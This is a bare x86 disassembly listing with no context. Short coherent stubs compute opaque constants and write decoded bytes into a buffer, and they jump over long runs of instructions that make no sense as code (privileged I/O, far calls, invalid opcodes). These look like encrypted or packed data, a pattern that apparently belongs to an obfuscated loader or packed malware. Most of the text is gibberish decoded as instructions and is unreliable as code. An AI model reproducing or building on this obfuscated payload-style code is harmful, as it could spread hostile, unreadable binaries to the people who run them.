  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0x7b
  416d7e:	loop   0x416d5d
  416d80:	jle    0x416dfc
  416d82:	hlt    
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    bh,dh
  416d8a:	xor    ah,BYTE PTR [ecx]
  416d8c:	stc    
  416d8d:	mov    BYTE PTR [eax],dh
  416d8f:	fnstenv [edx-0x46613c4f]
  416d95:	push   eax
  416d96:	scas   al,BYTE PTR es:[edi]
  416d97:	add    ecx,ecx
  416d99:	mov    eax,0xaf947fe3
  416d9e:	outs   dx,BYTE PTR ds:[esi]
  416d9f:	leave  
  416da0:	push   edi
  416da1:	loope  0x416dc2
  416da3:	mov    al,0xa1
  416da5:	ror    DWORD PTR [edi],1
  416da7:	dec    ebx
  416da8:	push   es
  416da9:	test   BYTE PTR [ebx],cl
  416dab:	mov    ecx,0xebd12ce8
  416db0:	shl    DWORD PTR [ecx],0xfa
  416db3:	mov    BYTE PTR [edx-0x51],dh
  416db6:	cmp    eax,0x9fa429d0
  416dbb:	mov    cs,WORD PTR [ebx-0x33]
  416dbe:	lahf   
  416dbf:	addr16 push eax
  416dc1:	mov    edi,0x841829d3
  416dc6:	and    BYTE PTR [ecx+0x2d],ch
  416dc9:	lods   eax,DWORD PTR ds:[esi]
  416dca:	lods   eax,DWORD PTR ds:[esi]
  416dcb:	mov    eax,edx
  416dcd:	sub    eax,0x50dd270e
  416dd2:	ret    
  416dd3:	mov    al,0x3b
  416dd5:	in     al,dx
  416dd6:	inc    edi
  416dd7:	mov    al,ds:0x98fef38d
  416ddc:	xchg   edi,eax
  416ddd:	lahf   
  416dde:	mov    eax,0xb10f6b7a
  416de3:	jb     0x416de5
  416de5:	xchg   ecx,eax
  416de6:	mov    esi,0x7e4bf79
  416deb:	out    0xf7,al
  416ded:	xor    ah,BYTE PTR [ecx+0x67]
  416df0:	scas   al,BYTE PTR es:[edi]
  416df1:	jmp    0x4c3b231
  416df6:	mov    ch,0xdf
  416df8:	mov    ch,0x45
  416dfa:	scas   eax,DWORD PTR es:[edi]
  416dfb:	aas    
  416dfc:	fnstsw WORD PTR [ebx+0x1f]
  416dff:	sbb    DWORD PTR [edi-0x5d412f58],esp
  416e05:	out    dx,al
  416e06:	sub    al,0xc0
  416e08:	or     ebp,DWORD PTR [eax-0x6186a065]
  416e0e:	outs   dx,BYTE PTR ds:[esi]
  416e0f:	scas   eax,DWORD PTR es:[edi]
  416e10:	in     eax,0x80
  416e12:	inc    edi
  416e13:	xor    bl,ch
  416e15:	nop
  416e16:	out    dx,al
  416e17:	shl    BYTE PTR [edi],1
  416e19:	xchg   cl,dl
  416e1b:	jno    0x416e25
  416e1d:	in     eax,dx
  416e1e:	mov    al,ds:0x5d213b7
  416e23:	fsub   DWORD PTR [ecx+0x64]
  416e26:	mov    dl,0x55
  416e28:	lods   al,BYTE PTR ds:[esi]
  416e29:	hlt    
  416e2a:	fcom   DWORD PTR [ebx-0x2766f3c4]
  416e30:	inc    edi
  416e31:	push   esi
  416e32:	push   edx
  416e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e34:	mov    ds:0x9926ddde,eax
  416e39:	pop    es
  416e3a:	pushf  
  416e3b:	xchg   ecx,eax
  416e3c:	inc    ecx
  416e3d:	cmc    
  416e3e:	shl    BYTE PTR [edi-0x33],cl
  416e41:	(bad)  
  416e42:	cmp    eax,0xbcf8028
  416e47:	push   0xcaea087f
  416e4c:	ja     0x416e8d
  416e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4f:	or     dl,dh
  416e51:	adc    al,0x2
  416e53:	mov    edi,0xa8f0076c
  416e58:	mov    al,0xad
  416e5a:	test   al,0x38
  416e5c:	fimul  DWORD PTR [eax-0x5b0f153d]
  416e62:	cmp    DWORD PTR [ecx+0x2bea234f],edi
  416e68:	test   DWORD PTR [esi],eax
  416e6a:	dec    edx
  416e6b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416e6d:	push   eax
  416e6e:	and    al,0xe9
  416e70:	pop    eax
  416e71:	pop    ebx
  416e72:	add    al,BYTE PTR [eax+0x30]
  416e75:	xchg   esi,eax
  416e76:	outs   dx,DWORD PTR ds:[esi]
  416e77:	fild   QWORD PTR [esi+edx*4-0x6c]
  416e7b:	mov    al,ds:0x667c875
  416e80:	aas    
  416e81:	jmp    0x6b1a:0xd5675a28
  416e88:	or     BYTE PTR [edx-0x4d],al
  416e8b:	cmp    eax,0xc15d74e7
  416e90:	lods   al,BYTE PTR ds:[esi]
  416e91:	xchg   ebx,eax
  416e92:	test   al,0x1c
  416e94:	push   edx
  416e95:	ja     0x416eb1
  416e97:	rol    DWORD PTR [ecx],0x8c
  416e9a:	test   BYTE PTR [eax-0x41873a5],al
  416ea0:	icebp  
  416ea1:	cmp    DWORD PTR [edi-0xd],0x78bf6cc8
  416ea8:	dec    ecx
  416ea9:	jo     0x416e77
  416eab:	push   esp
  416eac:	push   ss
  416ead:	sub    BYTE PTR [esi+0x2d],bh
  416eb0:	dec    esp
  416eb1:	lods   eax,DWORD PTR ds:[esi]
  416eb2:	in     eax,dx
  416eb3:	fmul   QWORD PTR [ebp-0x4f]
  416eb6:	loopne 0x416f22
  416eb8:	cmp    DWORD PTR [ebp+0x5cc19abf],esp
  416ebe:	stos   BYTE PTR es:[edi],al
  416ebf:	or     DWORD PTR [ebp+ecx*1+0x40],ebx
  416ec3:	std    
  416ec4:	in     al,0x40
  416ec6:	pop    ebp
  416ec7:	rcl    BYTE PTR ds:0xe9d1bc76,0xa9
  416ece:	jns    0x416e52
  416ed0:	adc    eax,0xc4db733b
  416ed5:	es pop es
  416ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ed8:	shl    BYTE PTR [eax-0x68],cl
  416edb:	stos   BYTE PTR es:[edi],al
  416edc:	jge    0x416e7e
  416ede:	aam    0x26
  416ee0:	jle    0x416ef5
  416ee2:	loope  0x416ecb
  416ee4:	xor    DWORD PTR [eax-0x1592d13d],esp
  416eea:	sti    
  416eeb:	sub    eax,0xfe8b5f69
  416ef0:	sbb    al,BYTE PTR [edx-0x2c]
  416ef3:	out    0x26,al
  416ef5:	call   FWORD PTR [edx+ebx*2]
  416ef8:	or     al,0x72
  416efb:	xor    esp,edi
  416efd:	sub    al,0x51
  416eff:	jno    0x416eda
  416f01:	cmp    eax,0xa6d8f460
  416f06:	pop    ecx
  416f07:	in     eax,0x60
  416f09:	sbb    BYTE PTR [eax-0x6b],cl
  416f0c:	mov    ah,0x7c
  416f0e:	add    eax,0xf80ffef9
  416f13:	ret    
  416f14:	pop    ecx
  416f15:	jg     0x416f01
  416f17:	and    ebx,eax
  416f19:	add    BYTE PTR [edx],dh
  416f1b:	les    eax,FWORD PTR [ebx+ebp*2+0x33]
  416f1f:	pop    edx
  416f20:	pop    ds
  416f21:	xchg   ebx,eax
  416f22:	push   ebx
  416f23:	jmp    0x57c3bfdb
  416f28:	es cmc 
  416f2a:	sbb    DWORD PTR [eax+0x477e8812],0x7931498b
  416f34:	push   esi
  416f35:	add    edi,DWORD PTR [ebp-0x70cb2766]
  416f3b:	or     eax,0x4ffe71b8
  416f40:	(bad)  [edx]
  416f42:	dec    edx
  416f43:	test   al,0xf7
  416f45:	rcl    DWORD PTR [ecx-0x7d],1
  416f48:	sbb    ebp,edx
  416f4a:	gs xor al,0xca
  416f4d:	or     edi,DWORD PTR [edi-0x2]
  416f50:	cld    
  416f51:	sbb    eax,0x1d07b006
  416f56:	add    BYTE PTR [ebx+edi*1+0x67],bl
  416f5a:	test   cl,bl
  416f5c:	sbb    eax,0x38a1e4f2
  416f61:	sbb    eax,0x58246c9d
  416f66:	aad    0xb1
  416f68:	retf   
  416f69:	mov    ds:0x444f0888,eax
  416f6e:	jecxz  0x416fec
  416f70:	ins    BYTE PTR es:[edi],dx
  416f71:	ret    0xa0a8
  416f74:	and    DWORD PTR [ebx+0x2631dd21],esi
  416f7a:	shl    DWORD PTR [ecx],cl
  416f7c:	leave  
  416f7d:	gs loopne 0x416f83
  416f80:	gs in  al,0xaa
  416f83:	imul   ecx,DWORD PTR [esi-0x25],0xffffff9b
  416f87:	mov    edx,0xd1cfa3a3
  416f8c:	lea    ecx,[eax]
  416f8e:	outs   dx,DWORD PTR ds:[esi]
  416f8f:	dec    esp
  416f90:	cmp    bh,BYTE PTR [edx-0x1d1bb474]
  416f96:	enter  0x52fc,0xf0
  416f9a:	cmp    DWORD PTR [esi-0x47f492de],edi
  416fa0:	lock mov bh,0x5d
  416fa3:	sahf   
  416fa4:	inc    eax
  416fa5:	jne    0x416f66
  416fa7:	repnz lea edx,[eax]
  416faa:	leave  
  416fab:	jl     0x417004
  416fad:	push   edi
  416fae:	ins    DWORD PTR es:[edi],dx
  416faf:	mov    eax,0x278e79a3
  416fb4:	mov    esi,DWORD PTR [eax]
  416fb6:	jno    0x416f7b
  416fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb9:	and    eax,0x7b26196c
  416fbe:	xchg   ebx,eax
  416fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc0:	mov    edi,0x4c0d4ca5
  416fc5:	arpl   sp,bx
  416fc7:	sub    ebx,DWORD PTR [eax]
  416fc9:	iret   
  416fca:	adc    ch,cl
  416fcc:	fist   DWORD PTR [esi]
  416fce:	jno    0x98d9ba45
  416fd4:	sub    esp,DWORD PTR [esi+ebp*2]
  416fd7:	mov    bl,0x84
  416fd9:	or     eax,0x38abe639
  416fde:	dec    esi
  416fdf:	scas   eax,DWORD PTR es:[edi]
  416fe0:	repz jl 0x416fee
  416fe3:	pop    esp
  416fe4:	pusha  
  416fe5:	aas    
  416fe6:	push   ds
  416fe7:	repz mov WORD PTR [eax+ebp*1],es
  416feb:	cmp    BYTE PTR [edi],dh
  416fed:	mov    cs,ecx
  416fef:	rol    DWORD PTR [ebp*1-0x28db9a29],1
  416ff6:	mov    ebx,0x303b9364
  416ffb:	add    al,0x33
  416ffd:	mov    ecx,0x65352cf3
  417002:	xor    al,0xb1
  417004:	fs gs mov esp,0x76e632b5
  41700b:	mov    esp,0xd3238404
  417010:	test   dh,al
  417012:	mov    eax,0xc57c918b
  417017:	call   0xbf80:0xd1349e5f
  41701e:	in     al,0xe1
  417020:	icebp  
  417021:	or     BYTE PTR [esi],ah
  417023:	ja     0x41703e
  417025:	mov    esp,0x276de3ac
  41702a:	cld    
  41702b:	add    edi,0xc8dbd695
  417031:	out    dx,al
  417032:	fisubr WORD PTR [edi+ebp*8-0x2a]
  417036:	(bad)  
  417037:	or     BYTE PTR [ebx],cl
  417039:	mov    edi,0x9516e9f1
  41703e:	dec    edx
  41703f:	sbb    eax,0x9bf5b27d
  417044:	in     eax,dx
  417045:	add    eax,0x71f04c70
  41704a:	shr    DWORD PTR [eax-0x33],0x96
  41704e:	sar    esp,0x58
  417051:	push   ss
  417052:	das    
  417053:	test   BYTE PTR [eax],0x76
  417056:	lods   al,BYTE PTR ds:[esi]
  417057:	addr16 cld 
  417059:	xor    DWORD PTR [ebp+0x26],0x7fbe7587
  417060:	ja     0x41708d
  417062:	xchg   edi,eax
  417063:	(bad)  
  417064:	cmc    
  417065:	rcl    BYTE PTR [ecx],1
  417067:	pop    edi
  417068:	(bad)  
  417069:	jbe    0x417066
  41706b:	iret   
  41706c:	add    edi,DWORD PTR [esi-0x2058fbd3]
  417072:	jecxz  0x4170ce
  417074:	fst    DWORD PTR [ebp-0x7b3dff1]
  41707a:	push   edi
  41707b:	ss push eax
  41707d:	shl    BYTE PTR [edx-0xb23d06f],0xea
  417084:	push   cs
  417085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417087:	pop    ds
  417088:	xor    bh,BYTE PTR ds:0xf204
  41708d:	mov    bl,0x2
  41708f:	outs   dx,DWORD PTR ds:[esi]
  417090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417091:	loopne 0x41701a
  417093:	aas    
  417094:	add    BYTE PTR [esi+ebx*2],cl
  417097:	jp     0x417068
  417099:	sub    BYTE PTR [esi-0x69],0x7f
  41709d:	mov    esi,0x35da9bcb
  4170a2:	sbb    eax,0xfd232527
  4170a7:	jmp    0xf086fc7d
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x7e21446a
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [esi],dh
  41719f:	scas   eax,DWORD PTR es:[edi]
  4171a0:	mul    DWORD PTR cs:[ecx]
  4171a3:	mov    bl,0x29
  4171a5:	mov    ch,0x40
  4171a7:	(bad)  
  4171a8:	or     eax,0x8a9d0b65
  4171ad:	xor    BYTE PTR [edi+0x67],dl
  4171b0:	pop    ebp
  4171b1:	ds jecxz 0x4171c0
  4171b4:	sub    eax,0xf1e2bd47
  4171b9:	scas   eax,DWORD PTR es:[edi]
  4171ba:	pop    edx
  4171bb:	mov    esi,0xf132ce41
  4171c0:	lods   eax,DWORD PTR ds:[esi]
  4171c1:	sbb    esi,DWORD PTR [ebx*1-0x5a46061e]
  4171c8:	mov    ah,0x19
  4171ca:	mov    esp,0x3ff31e58
  4171cf:	aam    0x36
  4171d1:	into   
  4171d2:	push   ebx
  4171d3:	bnd jne 0x417247
  4171d6:	xchg   BYTE PTR [edx-0x13],al
  4171d9:	xchg   edx,eax
  4171da:	inc    edx
  4171db:	repz pop ds
  4171dd:	mov    WORD PTR [esi+0x6bc7975e],cs
  4171e3:	sar    cl,0x54
  4171e6:	ret    0x48df
  4171e9:	call   0x155f:0x8526d948
  4171f0:	loopne 0x41720a
  4171f2:	add    BYTE PTR [eax-0x34],0x79
  4171f6:	enter  0xc8a8,0x78
  4171fa:	ret    0x7994
  4171fd:	aaa    
  4171fe:	bound  edx,QWORD PTR ds:0x69c99152
  417204:	sub    DWORD PTR [ebx-0x1da6a234],esp
  41720a:	mov    bl,0xbc
  41720c:	retf   
  41720d:	test   al,0xb4
  41720f:	add    eax,0xe579a6a0
  417214:	das    
  417215:	inc    edi
  417216:	inc    ebp
  417217:	push   eax
  417218:	mov    al,0x1b
  41721a:	xchg   esi,eax
  41721b:	fmul   DWORD PTR [esi+0x30d45877]
  417221:	fcmovnu st,st(2)
  417223:	(bad)  [ebx]
  417225:	jae    0x41720c
  417227:	add    esi,edi
  417229:	xchg   ebp,eax
  41722a:	stos   BYTE PTR es:[edi],al
  41722b:	hlt    
  41722c:	xlat   BYTE PTR ds:[ebx]
  41722d:	in     al,0xcc
  41722f:	fsub   QWORD PTR [edi+0x6d]
  417232:	stos   BYTE PTR es:[edi],al
  417233:	mov    al,ds:0xd043ee54
  417238:	add    BYTE PTR [ecx],ch
  41723a:	nop
  41723b:	cdq    
  41723c:	jecxz  0x41729a
  41723e:	jmp    0x417219
  417240:	enter  0x2127,0xc4
  417244:	sub    edi,esi
  417246:	mov    ebx,0x80673a05
  41724b:	sub    BYTE PTR [esp+edx*1+0x4bc50a0],bh
  417252:	or     eax,0xe7e7223
  417257:	push   ds
  417258:	push   es
  417259:	mov    eax,ds:0xa778c734
  41725e:	arpl   cx,si
  417260:	push   cs
  417261:	add    ebx,DWORD PTR [ebp-0x12]
  417264:	sbb    BYTE PTR [edx-0x4cfc9e1d],cl
  41726a:	inc    ecx
  41726b:	shl    bl,cl
  41726d:	dec    eax
  41726e:	push   edi
  41726f:	mov    ds,WORD PTR [esi]
  417271:	test   eax,0xeb636393
  417276:	dec    bp
  417278:	or     al,BYTE PTR [esp+eiz*8]
  41727b:	pop    eax
  41727c:	jmp    0x41726f
  41727e:	add    al,0xc
  417280:	aaa    
  417281:	loope  0x417275
  417283:	jge    0x4172a1
  417285:	fistp  DWORD PTR [ecx-0x610efce1]
  41728b:	sti    
  41728c:	jle    0x417301
  41728e:	pmaxub mm3,QWORD PTR [ecx-0x26a63e50]
  417295:	call   0x1f3a:0x69325116
  41729c:	imul   edi,DWORD PTR [ecx+0x1],0xb945b310
  4172a3:	(bad)  
  4172a5:	data16 and al,0x6
  4172a8:	in     eax,0xf8
  4172aa:	fild   WORD PTR [ebx-0x13]
  4172ad:	push   cs
  4172ae:	enter  0x401a,0x70
  4172b2:	ret    0xf857
  4172b5:	stos   BYTE PTR es:[edi],al
  4172b6:	inc    esp
  4172b7:	jns    0x4172ff
  4172b9:	mov    ebp,DWORD PTR [ebp+0x42]
  4172bc:	mov    eax,ds:0x6643291d
  4172c1:	cmp    eax,0x4c23735c
  4172c6:	sbb    DWORD PTR [ecx-0x1d578857],ebx
  4172cc:	and    BYTE PTR [eax+edx*1],ch
  4172cf:	push   0x2626bc43
  4172d4:	mov    dl,0xaf
  4172d6:	add    bl,bl
  4172d8:	aam    0x15
  4172da:	fcomp  QWORD PTR fs:[ebp+0x26]
  4172de:	jge    0x417341
  4172e0:	inc    edi
  4172e1:	out    dx,al
  4172e2:	cmp    bl,BYTE PTR [edi+0x796dfd3e]
  4172e8:	imul   esi,ebp,0xffffffda
  4172eb:	js     0x4172cc
  4172ed:	stc    
  4172ee:	adc    ebx,DWORD PTR [ebx-0x3b]
  4172f1:	pop    edi
  4172f2:	jns    0x4172f2
  4172f4:	das    
  4172f5:	push   edx
  4172f6:	fdiv   DWORD PTR [eax+0x1]
  4172f9:	ss jmp 0x417305
  4172fc:	jnp    0x4172b1
  4172fe:	push   ecx
  4172ff:	jmp    0x417340
  417301:	pop    esi
  417302:	push   ss
  417303:	int    0x13
  417305:	xor    BYTE PTR [edx-0x65],al
  417308:	cmp    al,0xcd
  41730a:	mov    fs,WORD PTR [eiz*2-0x1d45d359]
  417311:	add    al,0x88
  417313:	(bad)  
  417314:	fstp   st(4)
  417316:	cmp    eax,0x72a5a94
  41731b:	jl     0x417366
  41731d:	cli    
  41731e:	and    DWORD PTR [esp+ebp*2],0xb3930717
  417325:	xor    al,BYTE PTR [esi]
  417327:	jl     0x417353
  417329:	jb     0x4172e3
  41732b:	and    eax,0xa9fb418c
  417330:	scas   al,BYTE PTR es:[edi]
  417331:	ret    
  417332:	ja     0x417307
  417334:	out    dx,al
  417335:	outs   dx,DWORD PTR ds:[esi]
  417336:	pop    es
  417337:	enter  0xe347,0x3c
  41733b:	lds    ebx,FWORD PTR [edx-0x1d5a35f1]
  417341:	lds    esi,FWORD PTR [ebx-0x2]
  417344:	cdq    
  417345:	mov    edi,0x5b5ce0ae
  41734a:	xor    BYTE PTR [esi+0x73],0xaf
  41734e:	cs push edx
  417350:	mov    bh,0xe6
  417352:	cmp    al,0x84
  417354:	fistp  WORD PTR [edi-0x68]
  417357:	ja     0x417371
  417359:	icebp  
  41735a:	and    eax,DWORD PTR [ebx+0x25c3e751]
  417360:	sub    esi,ecx
  417362:	gs and eax,ebp
  417365:	jnp    0x4173bd
  417367:	ins    BYTE PTR es:[edi],dx
  417368:	push   esp
  417369:	push   es
  41736a:	or     eax,DWORD PTR [eax]
  41736c:	xor    al,0xf0
  41736e:	xchg   edi,eax
  41736f:	pop    ss
  417370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417371:	sti    
  417372:	jecxz  0x4173f3
  417374:	(bad)  
  417375:	test   al,0x6
  417377:	jae    0x4173df
  417379:	add    bh,BYTE PTR [edi+0x23]
  41737c:	stos   BYTE PTR es:[edi],al
  41737d:	mov    esp,0x96c160ff
  417382:	shr    dh,1
  417384:	imul   ebp,DWORD PTR [edi],0x7c
  417387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417388:	enter  0x1c83,0xcd
  41738c:	lods   eax,DWORD PTR ds:[esi]
  41738d:	cli    
  41738e:	(bad)  
  41738f:	cwde   
  417390:	adc    eax,0x7f806129
  417395:	lds    edx,FWORD PTR [ecx+0x24]
  417398:	(bad)  
  417399:	lods   al,BYTE PTR ds:[esi]
  41739a:	jb     0x4173ce
  41739c:	and    eax,0x6d0fdf92
  4173a1:	jmp    0x15f523a4
  4173a6:	scas   al,BYTE PTR es:[edi]
  4173a7:	popf   
  4173a8:	clc    
  4173a9:	push   ecx
  4173aa:	mov    bl,0xbe
  4173ac:	call   0x622dae47
  4173b1:	mov    BYTE PTR [edx-0x64481a65],cl
  4173b7:	jmp    0x9d82:0x35288d1c
  4173be:	adc    DWORD PTR [edx+ecx*8],0x16698d24
  4173c5:	push   edi
  4173c6:	(bad)  
  4173c8:	in     eax,dx
  4173c9:	mov    cs,esi
  4173cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173cc:	arpl   WORD PTR [ecx],di
  4173ce:	adc    eax,0x9584693c
  4173d3:	(bad)  
  4173d4:	in     eax,dx
  4173d5:	outs   dx,DWORD PTR ds:[esi]
  4173d6:	cmp    bh,dl
  4173d8:	mov    ebx,0xe65c983a
  4173dd:	sbb    al,0x9c
  4173df:	add    ch,al
  4173e1:	data16 cmp al,0x30
  4173e4:	mov    esi,0xc0c94ce
  4173e9:	fstp   DWORD PTR [ebp+0x7bcf1298]
  4173ef:	outs   dx,DWORD PTR ds:[esi]
  4173f0:	fwait
  4173f1:	inc    esp
  4173f2:	mov    bl,0x2d
  4173f4:	cld    
  4173f5:	add    al,0x73
  4173f7:	pop    esp
  4173f8:	das    
  4173f9:	mov    ch,0xc0
  4173fb:	(bad)  
  4173fc:	fnstenv [si-0x21]
  417400:	mov    edi,0x37e127b7
  417405:	and    al,0xb9
  417407:	out    dx,eax
  417408:	scas   eax,DWORD PTR es:[edi]
  417409:	fdiv   DWORD PTR [edi]
  41740b:	xchg   ebx,eax
  41740c:	adc    BYTE PTR [edx],0x4e
  41740f:	push   edx
  417410:	dec    ecx
  417411:	sar    bh,cl
  417413:	scas   al,BYTE PTR es:[edi]
  417414:	xor    esp,esp
  417416:	mov    ecx,0x70de5db9
  41741b:	hlt    
  41741c:	aad    0x26
  41741e:	imul   ebp,DWORD PTR [eax+0x3],0x966d310f
  417425:	jmp    0xc20a0717
  41742a:	addr16 mov al,0x45
  41742d:	sbb    al,0x5e
  41742f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417430:	cmp    BYTE PTR [esi+ebx*4],ch
  417433:	hlt    
  417434:	mov    ecx,0x43f086f7
  417439:	dec    edi
  41743a:	ins    DWORD PTR es:[edi],dx
  41743b:	mov    dl,0xe0
  41743d:	cmp    DWORD PTR [ebx],ebp
  41743f:	mov    eax,DWORD PTR [ebp+0x7c]
  417442:	pushf  
  417443:	out    dx,al
  417444:	call   0x7dff9f6d
  417449:	test   eax,0x929216a2
  41744e:	push   ss
  41744f:	mov    ?,ecx
  417451:	inc    ecx
  417452:	and    BYTE PTR [eax-0x6],al
  417455:	cmp    DWORD PTR [esi+0x13],edi
  417458:	dec    ebx
  417459:	nop
  41745a:	sbb    eax,0xeff0e759
  41745f:	pop    ds
  417460:	push   ss
  417461:	mov    ecx,0x616abb3d
  417466:	inc    ebx
  417467:	ins    DWORD PTR es:[edi],dx
  417468:	pop    ebp
  417469:	and    dl,0x2
  41746c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41746d:	xchg   esp,eax
  41746e:	or     ch,BYTE PTR [ecx-0x6b8a918b]
  417474:	je     0x417403
  417476:	add    DWORD PTR [esi+0x6d6925bc],0x23e576a0
  417480:	add    BYTE PTR [ecx],0x90
  417483:	mov    ah,dh
  417485:	inc    ecx
  417486:	lds    eax,FWORD PTR [esi]
  417488:	int    0x40
  41748a:	adc    DWORD PTR [ebx],ebp
  41748c:	int    0xb1
  41748e:	mov    fs:0xa6e7b7fb,al
  417494:	enter  0x3453,0x40
  417498:	pop    edi
  417499:	add    al,0xe6
  41749b:	aam    0xfa
  41749d:	das    
  41749e:	dec    ebp
  41749f:	pushf  
  4174a0:	fiadd  DWORD PTR [ecx]
  4174a2:	dec    ebp
  4174a3:	pop    edx
  4174a4:	popf   
  4174a5:	push   eax
  4174a6:	and    al,0x3d
  4174a8:	int3   
  4174a9:	xchg   esi,eax
  4174aa:	bound  edi,QWORD PTR [ecx-0x5f67355a]
  4174b0:	cmp    eax,0x778ac6df
  4174b5:	ret    
  4174b6:	dec    edi
  4174b7:	test   al,0x38
  4174b9:	adc    esi,DWORD PTR [esi]
  4174bb:	xor    eax,DWORD PTR [eax-0x3ecca5bc]
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223a4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e40
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422390
  417502:	call   DWORD PTR ds:0x428e64
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e4c
  41750f:	mov    ecx,DWORD PTR ds:0x422758
  417515:	sub    DWORD PTR ds:0x4282df,0x42835b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [esi+ecx*8+0xa6a06d5]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0xf58e7e8],bh
  41753e:	aad    0x28
  417540:	out    dx,al
  417541:	arpl   WORD PTR ds:0xa6b76144,cx
  417547:	je     0x4174d6
  417549:	xor    ch,BYTE PTR [ebx+edi*2+0xf243d49]
  417550:	outs   dx,BYTE PTR ds:[esi]
  417551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
